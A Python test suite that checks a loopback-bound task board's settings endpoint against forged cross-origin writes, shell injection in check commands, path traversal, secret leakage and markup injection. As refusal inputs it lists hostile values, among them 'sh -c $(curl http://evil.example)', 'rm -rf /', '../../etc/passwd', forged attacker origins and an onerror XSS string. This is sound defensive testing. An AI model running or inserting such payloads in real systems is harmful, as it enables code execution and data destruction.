"""Policy modification is an authority boundary (task 74).

Everything else this server does is bookkeeping about work. Changing the
execution policy is what *decides* what a launch may do and what a merge
must have, so the one route that edits it is held to a stricter door — and
the door is in the server, not in the page.

The threat this suite is about is specific and real: the board binds to
loopback and has no authentication, so a page on another origin, opened in
the same browser, can post to it without ever reading a reply. Three
things together refuse that, and none of them trusts a field in the body.

Beside that, the two things a settings surface must never become — a
generic file-write endpoint and a way to leak a secret — and the promise
that saving cannot move work.

These run a real board on a loopback port, with the inherited `BOARD_*`,
`AGENT_*` and `BENCH_*` variables removed, against a disposable
application and work state. Nothing is shared with any board a developer
is running.

    python3 -m unittest discover -s tests -v
"""

from __future__ import annotations

import json
import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import time
import unittest
import urllib.error
import urllib.request
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
CORE = REPO / "manager" / "core"

START = {
    "v": 1,
    "checks": [{"name": "unit", "run": "python3 -m unittest discover -s tests",
                "root": "worktree"}],
    "profiles": {"work": {"verify": ["unit"]}},
}

HEADERS = {"Content-Type": "application/json", "X-Bench-Settings": "1"}


def free_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


class Board:
    """One disposable board: the candidate's own manager/core, serving an
    application and a work state made here, on a loopback port."""

    def __init__(self, case: unittest.TestCase, doc=START):
        self.dir = Path(tempfile.mkdtemp(prefix="bench-settings-api-"))
        case.addCleanup(self._clean)
        self.tool = self.dir / "tool"
        self.app, self.work = self.dir / "app", self.dir / "work"
        shutil.copytree(CORE, self.tool / "manager" / "core",
                        ignore=shutil.ignore_patterns("__pycache__"))
        (self.tool / "manager" / "local").mkdir(parents=True)
        (self.tool / "manager" / "local" / ".env").write_text("",
                                                              encoding="utf-8")
        self.doc_path = self.tool / "manager" / "local" / "profiles.json"
        if doc is not None:
            self.doc_path.write_text(json.dumps(doc, indent=2) + "\n",
                                     encoding="utf-8")
        for repo in (self.app, self.work):
            repo.mkdir()
            self._git(repo, "init", "-q", "-b", "main")
            (repo / "README.md").write_text("settings api fixture\n")
            self._git(repo, "add", "-A")
            self._git(repo, "-c", "user.email=t@example.com",
                      "-c", "user.name=tester", "commit", "-q", "-m", "fixture")
        for stage in ("backlog", "to-do", "in-progress", "review", "done",
                      "archive"):
            (self.work / "tasks" / stage).mkdir(parents=True)
        (self.work / "tasks" / "review" / "01-a-card.md").write_text(
            "# A card\n\n**Status:** Review\n**Priority:** Low\n",
            encoding="utf-8")
        self.port = free_port()
        self.url = f"http://127.0.0.1:{self.port}"
        self.env = {k: v for k, v in os.environ.items()
                    if not k.startswith(("BOARD_", "AGENT_", "BENCH_"))}
        self.env.update({
            "BOARD_APP_ROOT": str(self.app), "BOARD_WORK_ROOT": str(self.work),
            "BOARD_WORKTREES": str(self.dir / "worktrees"),
            "BOARD_PORT": str(self.port), "BOARD_PR_POLL_INTERVAL": "3600",
            "BOARD_PHASE_INTERVAL": "3600", "BOARD_SYNC": "0",
            "BOARD_COMMIT_MOVES": "0", "BOARD_WATCH_INTERVAL": "3600",
            "BOARD_GH_BIN": str(self.dir / "no-gh")})
        self.log = open(self.dir / "board.log", "wb")
        self.proc = subprocess.Popen(
            [sys.executable, str(self.tool / "manager" / "core" / "board.py"),
             "--port", str(self.port), "--no-open"],
            cwd=str(self.tool), env=self.env, stdout=self.log,
            stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        deadline = time.time() + 30
        while time.time() < deadline:
            if self.proc.poll() is not None:
                raise AssertionError(
                    "the board exited: "
                    + (self.dir / "board.log").read_text(errors="replace"))
            try:
                if self.get("/api/state")[0] == 200:
                    return
            except OSError:
                pass
            time.sleep(0.15)
        raise AssertionError("the board never answered /api/state")

    def _git(self, repo: Path, *args: str) -> None:
        env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
        out = subprocess.run(["git", "-C", str(repo), *args], env=env,
                             capture_output=True, text=True)
        if out.returncode != 0:
            raise AssertionError(f"fixture git {args}: {out.stderr}")

    def _clean(self):
        if self.proc.poll() is None:
            self.proc.terminate()
            try:
                self.proc.wait(10)
            except subprocess.TimeoutExpired:
                self.proc.kill()
        self.log.close()
        shutil.rmtree(self.dir, ignore_errors=True)

    def _open(self, req) -> tuple[int, dict]:
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        try:
            with opener.open(req, timeout=20) as resp:
                return resp.status, json.loads(resp.read() or b"{}")
        except urllib.error.HTTPError as exc:
            body = exc.read()
            try:
                return exc.code, json.loads(body or b"{}")
            except json.JSONDecodeError:
                return exc.code, {"body": body.decode("utf-8", "replace")}

    def get(self, path: str) -> tuple[int, dict]:
        return self._open(urllib.request.Request(self.url + path))

    def post(self, path: str, payload, *, headers=None,
             raw: bytes | None = None) -> tuple[int, dict]:
        body = raw if raw is not None else json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(self.url + path, data=body, method="POST")
        for key, value in (HEADERS if headers is None else headers).items():
            req.add_header(key, value)
        return self._open(req)

    def doc(self) -> dict:
        return json.loads(self.doc_path.read_text(encoding="utf-8"))

    def raw(self) -> str:
        return self.doc_path.read_text(encoding="utf-8")


class ThePolicyDoorRefusesAForgedWrite(unittest.TestCase):
    def test_a_write_without_the_custom_header_is_refused(self):
        """The header a cross-origin HTML form cannot set at all, and a
        cross-origin fetch can only set by asking for a CORS preflight
        this board does not answer."""
        board = Board(self)
        before = board.raw()
        for path in ("/api/settings/validate", "/api/settings/preview",
                     "/api/settings/apply"):
            code, data = board.post(
                path, {"document": {"v": 1}, "revision": ""},
                headers={"Content-Type": "application/json"})
            self.assertEqual(403, code, path)
            self.assertIn("X-Bench-Settings", data["error"], path)
            self.assertIn("Nothing was changed", data["error"], path)
        self.assertEqual(before, board.raw())

    def test_a_form_encoded_write_is_refused(self):
        """The one encoding a cross-origin form can actually send."""
        board = Board(self)
        before = board.raw()
        code, data = board.post(
            "/api/settings/apply", None,
            raw=b"document=%7B%22v%22%3A1%7D&revision=",
            headers={"Content-Type": "application/x-www-form-urlencoded",
                     "X-Bench-Settings": "1"})
        self.assertEqual(403, code)
        self.assertIn("application/json", data["error"])
        self.assertEqual(before, board.raw())

    def test_a_write_claiming_another_origin_is_refused_by_name(self):
        board = Board(self)
        before = board.raw()
        for origin in ("https://evil.example", "http://127.0.0.1:1",
                       "http://attacker.localhost.example"):
            code, data = board.post(
                "/api/settings/apply", {"document": {"v": 1}, "revision": ""},
                headers={**HEADERS, "Origin": origin})
            self.assertEqual(403, code, origin)
            self.assertIn("Nothing was changed", data["error"], origin)
        self.assertEqual(before, board.raw())

    def test_a_cross_site_fetch_metadata_header_is_refused(self):
        board = Board(self)
        code, data = board.post(
            "/api/settings/apply", {"document": {"v": 1}, "revision": ""},
            headers={**HEADERS, "Sec-Fetch-Site": "cross-site"})
        self.assertEqual(403, code)
        self.assertIn("cross-site", data["error"])

    def test_the_boards_own_page_is_accepted(self):
        board = Board(self)
        code, data = board.post(
            "/api/settings/validate", {"document": board.doc()},
            headers={**HEADERS, "Origin": f"http://127.0.0.1:{board.port}",
                     "Sec-Fetch-Site": "same-origin"})
        self.assertEqual(200, code, data)
        self.assertTrue(data["validation"]["ok"], data["validation"]["errors"])

    def test_there_is_no_preflight_for_a_cross_origin_fetch_to_pass(self):
        """A cross-origin `fetch` with a custom header must preflight. This
        board answers no OPTIONS, so the real request is never sent."""
        board = Board(self)
        req = urllib.request.Request(board.url + "/api/settings/apply",
                                     method="OPTIONS")
        req.add_header("Origin", "https://evil.example")
        req.add_header("Access-Control-Request-Method", "POST")
        req.add_header("Access-Control-Request-Headers", "x-bench-settings")
        code, _ = board._open(req)
        self.assertNotEqual(200, code)
        self.assertNotEqual(204, code)

    def test_no_response_hands_out_a_cross_origin_permission(self):
        board = Board(self)
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        with opener.open(board.url + "/api/settings", timeout=20) as resp:
            self.assertIsNone(resp.headers.get("Access-Control-Allow-Origin"))

    def test_a_get_of_the_settings_needs_no_ceremony(self):
        """Reading is reading. The door is on the mutation, so opening the
        page from the board's own URL is an ordinary GET."""
        board = Board(self)
        code, data = board.get("/api/settings")
        self.assertEqual(200, code)
        self.assertIn("overview", data["settings"])


class ThisIsNotAFileWriteOrShellEndpoint(unittest.TestCase):
    def test_a_check_cannot_name_a_shell_pipeline_or_a_redirection(self):
        board = Board(self)
        before = board.raw()
        for run in ("python3 -m unittest > /tmp/out",
                    "python3 -m unittest; rm -rf /",
                    "python3 -m unittest | tee /tmp/x",
                    "sh -c $(curl http://evil.example)",
                    "python3 -m unittest && echo ok",
                    "./relative-thing",
                    "../../../bin/sh"):
            code, data = board.post("/api/settings/apply", {
                "document": {"v": 1, "checks": [
                    {"name": "x", "run": run, "root": "worktree"}]},
                "revision": ""})
            self.assertEqual(409, code, run)
            self.assertIn("was not written", data["error"], run)
        self.assertEqual(before, board.raw())

    def test_a_check_cannot_be_declared_against_the_application_checkout(self):
        board = Board(self)
        code, data = board.post("/api/settings/apply", {
            "document": {"v": 1, "checks": [
                {"name": "x", "run": "python3 -m unittest", "root": "app"}]},
            "revision": ""})
        self.assertEqual(409, code)
        self.assertIn("was not written", data["error"])

    def test_the_write_target_is_one_path_a_request_cannot_choose(self):
        """A document is written where the policy is read from, and
        nowhere a request names. There is no path in the payload."""
        board = Board(self)
        code, data = board.post("/api/settings/apply", {
            "document": board.doc(), "revision": "",
            "path": "/tmp/bench-should-not-write-here.json",
            "file": "../../etc/passwd"})
        # the revision is wrong, so this is a conflict — and the point is
        # that neither extra field was read at all
        self.assertEqual(409, code, data)
        self.assertFalse(Path("/tmp/bench-should-not-write-here.json").exists())

    def test_a_masked_value_is_never_written_back_as_the_mask(self):
        board = Board(self)
        before = board.raw()
        code, data = board.post("/api/settings/apply", {
            "document": {"v": 1, "checks": [
                {"name": "x", "run": f"python3 {settings_mask()}",
                 "root": "worktree"}]},
            "revision": ""})
        self.assertEqual(409, code)
        self.assertIn("masked value is never written back", data["error"])
        self.assertEqual(before, board.raw())

    def test_an_argument_naming_a_credential_is_refused(self):
        board = Board(self)
        code, data = board.post("/api/settings/apply", {
            "document": {"v": 1, "checks": [
                {"name": "x", "run": "python3 -m pytest --env-file .env",
                 "root": "worktree"}]},
            "revision": ""})
        self.assertEqual(409, code)
        self.assertIn("was not written", data["error"])


def settings_mask() -> str:
    sys.path.insert(0, str(CORE))
    import settings as module  # noqa: E402
    return module.MASK


class SecretsDoNotReachAReader(unittest.TestCase):
    def test_a_credential_shaped_setting_is_masked_in_the_response(self):
        board = Board(self)
        board._clean()
        board = Board(self)
        # a second board, with a credential-shaped value in its own
        # environment: the catalogue must mask it by name
        board.env["GH_TOKEN"] = "ghp_0123456789abcdefghijklmnopqrstuvwx"
        code, data = board.get("/api/settings")
        self.assertEqual(200, code)
        text = json.dumps(data)
        self.assertNotIn("ghp_0123456789abcdefghijklmnopqrstuvwx", text)

    def test_the_scrubber_masks_credential_shapes_in_any_value(self):
        sys.path.insert(0, str(CORE))
        import settings as module
        for secret in ("ghp_0123456789abcdefghijklmnopqrstuvwx",
                       "github_pat_11ABCDEFGHIJKLMNOPQRSTUVWXYZ012345",
                       "sk-0123456789abcdefghijklmnop",
                       "xoxb-123456789012-abcdefghijkl",
                       "AKIAIOSFODNN7EXAMPLE",
                       "-----BEGIN RSA PRIVATE KEY-----"):
            self.assertNotIn(secret, module.scrub(f"value={secret} tail"),
                             secret)
            self.assertIn(module.MASK, module.scrub(f"value={secret} tail"))

    def test_a_setting_named_like_a_credential_is_masked_by_name(self):
        sys.path.insert(0, str(CORE))
        import settings as module
        for name in ("GH_TOKEN", "MY_API_KEY", "DB_PASSWORD",
                     "SOMETHING_SECRET", "ANTHROPIC_API_KEY"):
            shown, redacted = module.masked(name, "whatever-this-is")
            self.assertEqual(module.MASK, shown, name)
            self.assertTrue(redacted, name)
        # and an ordinary setting is not masked, so a reader can read it
        shown, redacted = module.masked("BOARD_APP_BASE", "main")
        self.assertEqual("main", shown)
        self.assertFalse(redacted)

    def test_no_approved_inputs_contents_are_in_the_response(self):
        board = Board(self)
        brief = board.tool / "manager" / "local" / "AGENTS.md"
        brief.write_text("THE-SECRET-BRIEF-CONTENTS\n", encoding="utf-8")
        board.doc_path.write_text(json.dumps({
            **START, "context": [{"name": "brief",
                                  "path": "tool:manager/local/AGENTS.md"}]}),
            encoding="utf-8")
        code, data = board.get("/api/settings")
        self.assertEqual(200, code)
        text = json.dumps(data)
        self.assertNotIn("THE-SECRET-BRIEF-CONTENTS", text)
        # the identity is there; the bytes are not
        self.assertIn("brief", text)

    def test_the_history_holds_no_values(self):
        board = Board(self)
        code, data = board.post("/api/settings/apply", {
            "document": {**board.doc(),
                         "gates": {"acceptance": {"checks": ["unit"]}}},
            "revision": revision_of(board)})
        self.assertEqual(200, code, data)
        code, found = board.get("/api/settings/history")
        self.assertEqual(200, code)
        text = json.dumps(found)
        self.assertNotIn("python3 -m unittest", text)
        self.assertIn("gates", text)


def revision_of(board: Board) -> str:
    code, data = board.get("/api/settings")
    assert code == 200, data
    return data["settings"]["editing"]["draft"]["revision"]


# The safe ways a value reaches the page: `esc()` itself, and the helpers
# that escape everything they are given.
SAFE = ("esc(", "actLabel(", "stateWord(", "field(", "select(", "checkbox(",
        "fieldErrors(", "settingsCi(")

# The string-valued fields a settings payload carries. These are the ones
# that can hold a `<` — a check's command, a diagnostic's prose, a path out
# of somebody's disk — so an interpolation naming one of them and not going
# through `esc()` is the injection this test exists to catch. Counts and
# booleans are not here, because they cannot carry markup.
STRINGY = (
    ".run", ".name", ".why", ".detail", ".help", ".path", ".value",
    ".identity", ".remedy", ".what", ".who", ".authority", ".problem",
    ".error", ".how", ".title", ".supply", ".label", ".review", ".root",
    # `.errors` is deliberately absent: it is a list, and the strings
    # inside it (`.why`, `.remedy`, `.code`) are named above, so a count
    # of it is not a value a page can inject with.
    ".code", ".file", ".before", ".after", ".kind", ".outcome", ".does",
    ".proves", ".doesNotProve", ".mode", ".task", ".version", ".default",
    ".source", ".scope", ".requirement", ".state", ".summary", ".running",
    ".executable", ".rootWhy", ".appliesWhy", ".unavailableWhy", ".modeWhy",
    ".revisionWhy", "JSON.stringify",
)


def interpolations(body: str) -> list[str]:
    """Every `${…}` in a template, outermost only.

    A balanced scan rather than a regular expression, because these
    templates nest: `${esc(xs.map(x => `${x.name}`).join())}` is one
    escaped interpolation, and a non-greedy regex reads it as an
    unescaped one. Getting that wrong in the lenient direction is how a
    test like this passes while the page injects.
    """
    found, i = [], 0
    while True:
        at = body.find("${", i)
        if at < 0:
            return found
        depth, j = 0, at + 1
        while j < len(body):
            if body[j] == "{":
                depth += 1
            elif body[j] == "}":
                depth -= 1
                if depth == 0:
                    break
            j += 1
        found.append(body[at + 2:j])
        i = j + 1


class DocumentTextIsRenderedInert(unittest.TestCase):
    def test_markup_in_a_document_value_is_escaped_by_the_page(self):
        """The page escapes everything it draws, and these are the
        renderers that draw document-derived text. A template that
        interpolated a string field without `esc()` is the injection."""
        html = (CORE / "board.html").read_text(encoding="utf-8")
        checked = 0
        for name in ("settingsVerification", "settingsAcceptance",
                     "settingsAccess", "settingsInstallation",
                     "settingsOverview", "settingsPolicy",
                     "settingsDiagnostics", "settingsCi", "stateWord"):
            start = html.index(f"function {name}(")
            body = html[start:html.index("\n}\n", start)]
            bare = []
            for expr in interpolations(body):
                checked += 1
                if any(safe in expr for safe in SAFE):
                    continue
                # whole property names, so `.errors.length` is not read as
                # the string field `.error`
                if re.search(r"(" + "|".join(
                        re.escape(f) for f in STRINGY) + r")\b", expr):
                    bare.append(expr)
            self.assertEqual([], bare,
                             f"{name} interpolates unescaped values: {bare}")
        self.assertGreater(checked, 80,
                           "the scanner found almost no interpolations, so it "
                           "is not reading these renderers")

    def test_the_escaper_covers_the_characters_that_make_markup(self):
        html = (CORE / "board.html").read_text(encoding="utf-8")
        start = html.index("const esc = ")
        body = html[start:start + 200]
        for char in ("&", "<", ">", '"'):
            self.assertIn(char, body, f"esc() does not handle {char!r}")

    def test_the_server_sends_no_html(self):
        board = Board(self)
        board.doc_path.write_text(json.dumps({
            "v": 1, "checks": [{"name": "x",
                                "run": "python3 -m unittest",
                                "root": "worktree",
                                "help": "<img src=x onerror=alert(1)>"}]}),
            encoding="utf-8")
        code, data = board.get("/api/settings")
        self.assertEqual(200, code)
        # the server does not sanitize — it carries the text and the page
        # escapes it, which is the one place that decision belongs. What
        # matters here is that it is carried as *data*, in JSON.
        self.assertIn("<img src=x onerror=alert(1)>", json.dumps(data))
        self.assertEqual("application/json",
                         content_type(board, "/api/settings"))


def content_type(board: Board, path: str) -> str:
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    with opener.open(board.url + path, timeout=20) as resp:
        return (resp.headers.get("Content-Type") or "").split(";")[0]


class SavingCannotMoveWork(unittest.TestCase):
    def test_an_apply_moves_no_card_and_opens_no_pull_request(self):
        board = Board(self)
        before = sorted(p.name for p in
                        (board.work / "tasks").rglob("*.md"))
        where = {p.name: p.parent.name for p in
                 (board.work / "tasks").rglob("*.md")}
        code, data = board.post("/api/settings/apply", {
            "document": {**board.doc(),
                         "gates": {"acceptance": {"checks": ["unit"]}}},
            "revision": revision_of(board)})
        self.assertEqual(200, code, data)
        self.assertEqual(before, sorted(p.name for p in
                                        (board.work / "tasks").rglob("*.md")))
        self.assertEqual(where, {p.name: p.parent.name for p in
                                 (board.work / "tasks").rglob("*.md")})
        # no branch was cut and no worktree was made
        self.assertFalse((board.dir / "worktrees").exists())
        code, state = board.get("/api/state")
        self.assertEqual([], state["agents"])

    def test_an_apply_makes_no_commit_in_either_repository(self):
        board = Board(self)
        heads = {name: self._head(board, path) for name, path
                 in (("app", board.app), ("work", board.work))}
        code, data = board.post("/api/settings/apply", {
            "document": {**board.doc(), "prepare": [
                {"name": "deps", "run": "python3 -m pip install -e ."}]},
            "revision": revision_of(board)})
        self.assertEqual(200, code, data)
        self.assertEqual(heads, {name: self._head(board, path) for name, path
                                 in (("app", board.app), ("work", board.work))})

    def _head(self, board: Board, path: Path) -> str:
        out = subprocess.run(["git", "-C", str(path), "rev-parse", "HEAD"],
                             capture_output=True, text=True)
        return out.stdout.strip()

    def test_an_apply_activates_the_gate_without_deciding_a_merge(self):
        """A gate takes effect the next time the mutation it guards is
        attempted. Applying one does not evaluate it, advance anything, or
        touch the card waiting in review/."""
        board = Board(self)
        code, data = board.post("/api/settings/apply", {
            "document": {**board.doc(),
                         "gates": {"acceptance": {"checks": ["unit"]}}},
            "revision": revision_of(board)})
        self.assertEqual(200, code, data)
        self.assertEqual("next-launch", data["applied"]["appliesAt"])
        # the gate is in force for the next *read*, and the card is
        # untouched: its own gate now reads blocked, with the reason
        code, gate = board.get(
            "/api/gates?file=01-a-card.md&stage=review")
        self.assertEqual(200, code, gate)
        acceptance = [s for s in gate["scopes"]
                      if s["scope"] == "acceptance"][0]
        self.assertIn(acceptance["decision"], ("blocked", "pending"))
        self.assertNotEqual("allowed", acceptance["decision"])
        self.assertNotEqual("ungated", acceptance["decision"])

    def test_the_settings_route_is_the_only_one_that_writes_the_document(self):
        """A grep, because the guarantee is about the whole server: one
        writer, one path."""
        text = (CORE / "httpd.py").read_text(encoding="utf-8")
        self.assertEqual(1, text.count("settings.apply("),
                         "more than one route writes the policy")
        self.assertIn("origin_problem(self.headers", text)


if __name__ == "__main__":
    unittest.main()
